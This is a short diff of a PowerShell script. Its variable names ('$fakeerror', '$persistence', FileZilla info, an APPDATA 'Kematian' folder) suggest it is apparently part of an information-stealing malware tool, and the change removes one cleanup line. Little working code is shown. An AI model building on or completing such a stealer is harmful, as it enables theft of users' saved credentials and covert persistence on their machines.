@@ -7,7 +7,6 @@ $fakeerror = $false
 $persistence = $true
 
 
-
 if ($debug) {
     $ProgressPreference = 'Continue'
 }
@@ -1144,7 +1143,6 @@ FileZilla: $filezilla_info
 
     # cleanup
     Remove-Item "$zipFilePath" -Force
-    Remove-Item "$folder_general" -Force -Recurse
     Remove-Item "$ENV:APPDATA\Kematian" -Force -Recurse
 }
 
